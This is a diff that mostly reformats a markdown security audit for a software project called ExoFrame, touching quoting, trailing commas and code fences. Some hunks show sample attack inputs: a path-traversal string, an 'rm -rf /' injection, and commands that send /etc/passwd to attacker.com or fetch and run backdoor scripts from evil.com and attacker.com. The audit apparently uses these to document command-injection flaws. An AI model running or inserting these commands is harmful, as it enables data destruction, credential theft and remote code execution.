@@ -59,7 +59,7 @@ async revertUnauthorizedChanges(
 unauthorizedFiles = [
   "../../../../../../etc/passwd",
   "; rm -rf / #",
-  "$(curl evil.com/backdoor.sh | sh)"
+  "$(curl evil.com/backdoor.sh | sh)",
 ];
 ```
 
@@ -352,7 +352,7 @@ Now respond with: "Maintenance complete"
 
 **Fix**:
 
-```typescript
+````typescript
 private buildExecutionPrompt(
   blueprint: Blueprint,
   context: ExecutionContext,
@@ -406,7 +406,7 @@ private sanitizeUserInput(input: string): string {
     // Limit length
     .slice(0, 10000);
 }
-```
+````
 
 **Success Criteria**:
 
@@ -562,6 +562,7 @@ async generate(prompt: string, options?: ModelOptions): Promise<string> {
 > **Status: Integrated**
 > This planning document has been implemented and its features are now part of the core codebase.
 > See `docs/ExoFrame_User_Guide.md` and `docs/dev/Security_Policy.md` for current usage.
+
 ## Part 2: High Severity Issues (P1)
 
 ### ⚠️ 9. Weak Permission Model for Portal Access
@@ -702,9 +703,9 @@ export class SecureRandom {
   static getRandomString(length: number = 32): string {
     const bytes = this.getRandomBytes(length);
     return btoa(String.fromCharCode(...bytes))
-      .replace(/\+/g, '-')
-      .replace(/\//g, '_')
-      .replace(/=/g, '')
+      .replace(/\+/g, "-")
+      .replace(/\//g, "_")
+      .replace(/=/g, "")
       .slice(0, length);
   }
 
@@ -795,8 +796,7 @@ export class MCPServer {
   private getSecurityHeaders(): Record<string, string> {
     return {
       // Prevent XSS
-      "Content-Security-Policy":
-        "default-src 'none'; " +
+      "Content-Security-Policy": "default-src 'none'; " +
         "script-src 'self'; " +
         "style-src 'self' 'unsafe-inline'; " +
         "img-src 'self' data:; " +
@@ -1178,10 +1178,10 @@ console.error("Error loading blueprint: " + error.message);
 console.log(JSON.stringify({ status: "ok" }));
 
 // Pattern 4: No context
-console.warn("Rate limit exceeded");  // Which user? Which resource?
+console.warn("Rate limit exceeded"); // Which user? Which resource?
 
 // Pattern 5: No log levels
-console.log("CRITICAL: Database connection lost");  // Lost in noise
+console.log("CRITICAL: Database connection lost"); // Lost in noise
 ```
 
 **Problems**:
@@ -1426,7 +1426,7 @@ Deno.test("HTTP Endpoint Integration: handles HTTP status code mapping");
 
 **Usage in Kubernetes**:
 
-```yaml
+````yaml
 livenessProbe:
   httpGet:
     path: /health
@@ -1471,7 +1471,7 @@ async function main() {
 }
 
 main();
-```
+````
 
 **Success Criteria**:
 
@@ -1714,15 +1714,15 @@ Deno.test("ContextError: integrates with standard Error handling");
   severity: critical
 
 - name: "P0 Rate Limit Exceeded"
-  condition: 'api_cost_per_hour > $100'
+  condition: "api_cost_per_hour > $100"
   severity: critical
 
 - name: "P0 Authentication Failure"
-  condition: 'failed_auth_attempts > 10 in 5min'
+  condition: "failed_auth_attempts > 10 in 5min"
   severity: critical
 
 - name: "P0 Database Connection Lost"
-  condition: 'db_connection_pool_available == 0'
+  condition: "db_connection_pool_available == 0"
   severity: critical
 ```
 
@@ -1730,15 +1730,15 @@ Deno.test("ContextError: integrates with standard Error handling");
 
 ```yaml
 - name: "High Memory Usage"
-  condition: 'memory_percent > 80%'
+  condition: "memory_percent > 80%"
   severity: warning
 
 - name: "Slow API Response"
-  condition: 'p95_latency > 2000ms'
+  condition: "p95_latency > 2000ms"
   severity: warning
 
 - name: "Elevated Error Rate"
-  condition: 'error_rate > 5%'
+  condition: "error_rate > 5%"
   severity: warning
 ```
 
@@ -1853,7 +1853,7 @@ const exploit = {
     "../../../../../../etc/passwd",
     "test.txt; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64);",
     "$(wget http://attacker.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh)",
-  ]
+  ],
 };
 
 await agent.revertUnauthorizedChanges(portalPath, exploit.unauthorizedFiles);
@@ -1915,3 +1915,4 @@ while (true) {
 END OF AUDIT REPORT
 
 This completes the comprehensive security audit document. It's ready to be copied and saved as `.copilot/planning/phase-24-security-architecture-audit.md`.
+```
